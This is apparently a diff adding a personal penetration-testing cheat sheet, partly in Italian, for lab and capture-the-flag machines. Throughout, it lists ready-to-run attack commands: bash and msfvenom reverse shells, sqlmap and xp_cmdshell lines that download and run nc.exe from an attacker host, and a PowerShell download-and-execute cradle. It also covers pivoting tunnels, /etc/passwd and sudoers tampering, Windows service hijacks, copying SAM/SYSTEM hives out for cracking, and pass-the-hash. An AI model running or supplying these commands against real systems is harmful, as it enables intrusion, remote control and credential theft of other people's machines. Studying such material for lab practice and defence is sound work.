@@ -1,0 +1,332 @@
+SSH ERROR
+
+ssh john@10.11.1.252 -p 22000 -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss
+
+PIVOTING
+
+Chisel:
+
+> chisel server --port 8000 --socks5 --reverse
+> ./chisel client --max-retry-count 1 192.168.119.123:8000 R:1080:socks
+(FYI: change socks5 127.0.0.1 1080 --> chisel on proxychains (NO sudo))
+
+SSHUTTLE (only 22 open in the edge machine):
+> sshuttle -r sean@IP_EDGE 10.1.1.0/24
+
+SSH Forwarding Local:
+
+ssh -N -L 80:IPVittima:80 -L 443:IPVittima:443 sean@10.11.1.251
+======================================================================================================================
+PORT SCANNING:
+
+NMAP: sudo nmap -Pn -sC -sV -n -p- --min-rate 1000 --open $IP
+      sudo nmap -Pn -sU -n -sC -sV -p161 $IP
+      
+NC: nc -z -v $IP 1-1000 2>&1 | grep 'succeeded!'
+======================================================================================================================
+WEB FUZZING:
+
+FUZZING FILES: wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"
+FUZZING DIRECTORIES: wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL"
+FUZZING: wfuzz -H "Host: FUZZ.mentorquotes.htb" --hc 302,400 -t 50 -c -z file,"/opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt" http://mentorquotes.htb/
+
+GOBUSTER: 
+gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 30
+gobuster vhost -u $URL -w /usr/share/seclist/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 30
+
+NIKTO: nikto -h $URL
+======================================================================================================================
+REVERSE SHELL
+
+BASH:
+bash -i >& /dev/tcp/$LOCAL/80 0>&1 (try different port)
+
+SQLMAP:
+sqlmap -r request --level 5 --risk 3 --os-cmd="powershell Invoke-WebRequest -Uri http://IPAttacker/reverseshell.exe -OutFile C:\Windows\Temp\reverseshell.exe -UseBasicParsing"
+sqlmap -r request --level 5 --risk 3 --os-cmd="C:\Windows\Temp\reverseshell.exe"
+======================================================================================================================
+MSFVENOM REVERSE SHELL:
+
+EXE:
+msfvenom -p windows/shell/reverse_tcp LHOST=IPAttacker LPORT=80 -f exe > shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IPAttacker LPORT=80 -f exe > shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=IPAttacker LPORT=80 -f exe > shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=IPAttacker LPORT=80 -f exe > shell.exe
+
+JSP:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=IPAttacker LPORT=80 -f raw > shell.jsp
+
+ASP:
+msfvenom -p windows/shell/reverse_tcp LHOST=IPAttacker LPORT=80 -f asp > shell.asp
+
+WAR:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=IPAttacker LPORT=80 -f war > shell.war
+
+PHP:
+msfvenom -p php/reverse_php LHOST=IPAttacker LPORT=80 -f raw > shell.php
+msfvenom -p php/meterpreter/reverse_tcp LHOST=IPAttacker LPORT=80 -f raw -o shell.php
+======================================================================================================================
+BIND shell
+
+nc <VICTIM_IP> <PORT>
+======================================================================================================================
+Microsoft SQL Server:
+
+proxychains -q python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sa:CrimsonQuiltScalp193@10.1.1.68
+You check xp_cmdshell is enabled. If not you can enable it
+> xp_cmdshell "powershell.exe wget http://IPAttacker/nc.exe -OutFile c:\\Users\Public\\nc.exe"
+> xp_cmdshell  "c:\\Users\Public\\nc.exe -e cmd.exe IPAttacker 4444"
+======================================================================================================================
+SHELLSHOCK
+
+curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.11.1.227/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
+======================================================================================================================
+GCC 
+gcc -m32 -Wl,--hash-style=both -o exe/exploit 9542.c -Wall
+======================================================================================================================
+SMTP
+
+sudo nmap --script smtp-enum-users.nse --script-args smtp-enum-users.methods={VRFY} -p 25 $IP
+smtp-user-enum  -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $IP
+======================================================================================================================
+SMB
+
+sudo nmap -p139,445 --script smb-vuln-*  $IP
+smbclient -L //10.11.1.227 -N
+smbclient //10.11.1.227/dir -N
+
+Get version SMB:
+sudo ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]' port 139 (one terminal)
+echo exit | smbclient -L $IP
+======================================================================================================================
+Upgrading Simple Shells to Fully Interactive TTYs
+
+python2 -c "import pty; pty.spawn('/bin/bash')"
+python -c "import pty; pty.spawn('/bin/bash')"
+python3 -c "import pty; pty.spawn('/bin/bash')"
+======================================================================================================================
+RDESKTOP/EVIL-WINRM/PSEXEC
+
+rdesktop -u admin -p pass $IPVittima
+evil-winrm -i IPVittima -u admin -p pass
+impacket-psexec user:pass@IPVittima
+pth-winexe -U WORKGROUP/user%pass //IPVittima cmd.exe
+======================================================================================================================
+COPY FILE LINUX TO WINDOWS
+
+1.
+Certutil.exe on cmd
+- C:\Windows\Temp\
+- POTATO: certutil.exe -urlcache -f  "http://IPAttacker/potato.exe" potato.exe
+- WINPEAS: certutil.exe -urlcache -f "http://IPAttacker/winPEASany.exe" winpeas.exe 
+
+2.
+SMB: 
+on cmd:
+> net view \\IPAttacker
+> dir \\IPAttacker/START
+> copy \\IPAttacker/START/nc.exe
+
+on Kali:
+impacket-smbserver START .
+
+
+3.
+powershell iex (New-Object Net.WebClient).DownloadString('http://IPAttacker:7000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.1.1.246 -Port 443
+======================================================================================================================
+COPY FILE WINDOWS TO LINUX
+
+certutil.exe -urlcache -f  "http://IPAttacker/nc.exe" nc.exe
+
+Su Kali:
+nc -lvnp 4444 > hash.txt
+
+Su Windows:
+nc.exe -nv IPAttacker 4444 < kerb-Hash0.txt
+======================================================================================================================
+WINPEAS
+
+Add colors: reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+
+> winpeas.exe quite servicesinfo (Check service misconfiguration)
+> winpeas.exe quiet applicationsinfo quiet applicationsinfo (Check Registry)
+> winpeas.exe quiet filesinfo userinfo (Check password)
+> winpeas.exe quiet cmd windowscreds (Check credentials)
+======================================================================================================================
+Privilege Escalation in Linux
+
+linuxprivchecker.py 
+
+BASIC:
+
+    KERNEL:
+    > uname -a
+    > cat /proc/version 2>/dev/null
+
+    OS version:
+    > hostnamectl 2>/dev/null
+    > lsb_release -a 2>/dev/null
+    > cat /etc/os-release 2>/dev/null
+    
+    Useful SW installed:
+    > which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
+
+CRON:
+    > crontab -l
+    > ls -al /etc/cron* /etc/at*
+    > cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
+    > echo 'echo "useradm ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
+
+SUID:
+    > find / -perm -u=s -type f 2>/dev/null (GTOBins)
+    Example cp:
+    - openssl passwd -1 -salt pwn pass123
+    - Copy etc/passwd in a local file in the attacker machine
+    - curl http://IPAttacker:8000/passwd--output /tmp/passwd
+    - cp passwd /etc/passwd
+    - ssh pwn@10.11.1.35 (password pass123)
+
+Weak File Permissions:
+    > ls -la /etc/passwd
+    > echo root::0:0:root:/root:/bin/bash > /etc/passwd (root senza password)
+    > su
+
+Env info:
+    > (env || set) 2>/dev/null
+
+Drives (check mounted and unmounted)
+   > grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
+   > ls /dev 2>/dev/null | grep -i "sd"
+   > cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
+
+Vulnerable SW installed:
+    > dpkg -l #Debian
+    > rpm -qa #Centos
+
+Processes:
+    > ps aux
+    > ps -ef
+    > top -n 1
+
+NFS Shared:
+======================================================================================================================
+Privilege Escalation in Windows
+
+- potato.exe
+
+Basic Commands
+> reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 (Run color Winpeas)
+> sc qc <name_service> (service current configuration)
+> sc query <name_service> (service current status)
+> sc config <name_service> (service modify options)
+> net start/stop <name_service>
+> accesschk.exe /accepteula -uwcqv <user> <name_service> (check which service an user can modify)
+> accesschk.exe /accepteula -uwcqv <user> * (check all services an user can modify)
+> accesschk.exe -ucqv <name_service> /accepteula
+
+[***USER INFO***]
+A) SeImpersonatePrivilege
+> whoami /priv
+or
+> winpeas.exe quiet userinfo
+
+[***SERVICE MISCONFIGURATION***]
+
+A) Insecure Service Permissions (winpeas: YOU CAN MODIFY THIS SERVICE)
+> winpeas.exe quiet servicesinfo > scanwin.txt
+> accesschk.exe /accepteula -uwcqv claudio <name_service>
+> sc qc <name_service> (Binary path name and Service start name=LocalSystem)
+> sc query <name_service> (state=STOPPED)
+> sc config <name_service> binpath="\"C:\reverse.exe\""
+> nc -lvnp 53
+> net start <name_service>
+
+B) Unquoted Service Path (winpeas: unquoted)
+> winpeas.exe quiet servicesinfo > scanwin.txt
+> accesschk /accepteula -ucqv claudio <name_service>
+> accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" (search BUILTIN\Users)
+> copy "reverse shell path" "C:\Program Files\Unquoted Path Service\Common.exe"
+> nc -lvnp 53
+> net start <name_service>
+
+C) Weak Registry Permissions (winpeas: the key Looking if you can modify any service registry)
+> winpeas.exe quiet servicesinfo > scanwin.txt
+> accesschk.exe /accepteula -uvwqk HKLM:\System\CurrentControlSet\Services\<name_service> (RW NT AUTHORITY\INTERACTIVE full control.This group take all suer log into the windows)
+> accesschk /accepteula -ucqv claudio <name_service>
+> reg query HKLM\SYSTEM\CurrentControlSet\services\<name_service>
+> reg add HKLM\SYSTEM\CurrentControlSet\services\<name_service> /v ImagePath /t REG_EXPAND_SZ /d C:\privEsc\reverse.exe /f
+> nc -lvnp 53
+> net start <name_service>
+
+D) Insecure Service Executables (winpeas: File Permissions: Everyone [All Access])
+> winpeas.exe quiet servicesinfo > scanwin.txt
+>.\accesschk.exe /accepteula -quvw "path_service" (RM Everyone FILE_ALL_ACCESS)
+> accesschk /accepteula -ucqv  <name_service>
+> copy "path_service" C:\Temp
+> copy /Y path_reverse "path_service"
+> nc -lvnp 53
+> net start <name_service>
+
+E) DLL Hijacking (winpeas: DLL Hijacking, DLL Hijack Service)
+> winpeas.exe quiet servicesinfo > scanwin.txt
+> accesschk.exe /accepteula -uvqc claudio <name_service>
+> sc qc <name_service> (Binary path name and Service start name=LocalSystem)
+> process monitor per monitorare <name_service> (see tiberius parte 7 )
+> net start <name_service> 
+> msfvenom -p windows/x64/shell_reverse_tcp LHOST=IPAttacker LPORT=53 -f dll -o /tools/hijackme.dll
+> nc -lvnp 53
+> copy \\IPAttacker\tools\hijackme.dll C:\Temp (in the process monitor it is find the dll in C:\Temp)
+> net stop <name_service>
+> net start <name_service>
+
+[***Registry***]
+
+A) Autoruns (winpeas: Autorun Applications)
+> winpeas.exe quiet applicationsinfo > scanwin.txt
+> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+> .\accesschk.exe /accepteula -wvu "path_file"
+> copy "path_file" C:\Temp
+> copy /Y C:\PrivEsc\reverse.exe "path_file"
+> nc -lvnp 53
+> restart the system
+
+B) AlwaysInstallElevated (winpeas: AlwaysInstallElevated set to 1)
+> winpeas.exe quiet windowscreds > scanwin.txt
+> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+> msfvenom -p windows/x64/shell_reverse_tcp LHOST=IPAttacker LPORT=53 -f msi -o reverse.msi
+> nc -lvnp 53
+> copy \\IPAttacker\tools\reverse.msi
+> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi 
+
+[***Password***]
+
+A) Registry
+> reg query HKLM /f password /t REG_SZ /s
+> reg query HKCU /f password /t REG_SZ /s
+> winpeas.exe quiet filesinfo userinfo > scanwin.txt
+> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+> winexe -U 'admin%password123' --system //IPVittima cmd.exe (Dalla Kali usanod le credenziali di logon trovate con winpeas) 
+
+B) Saved Creds
+> winpeas quiet cmd windowscreds > scanwin.txt
+> cmdkey /list
+> nc -lvnp 53
+> runas /savecred /user:admin C:\PrivEsc\reverse.exe
+
+C) Configuration Files
+> dir /s *pass* == *.config
+> findstr /si password *.xml *.ini *.txt
+or
+> winpeas quiet cmd searchfast filesinfo > scanwin.txt
+
+D) SAM (Security Account Manager) and SYSTEM
+> winpeas quiet cmd searchfast filesinfo > scanwin.txt
+> copy C:\Windows\Repair\SAM \\IPAttacker\tools\
+> copy C:\Windows\Repair\SYSTEM \\IPAttacker\tools\
+> python2 pwdump.py /tools/SYSTEM /tools/SAM (da creddump7)
+> hashcat -m 1000 --force hash(secondo) rockyou.txt (crack the hash)
+o
+> pth-winexe --system -U 'admin%hashcompleto(primo e secondo) //IPVittima cmd.exe (pass the hash)
+
+[***Scheduled Tasks***]
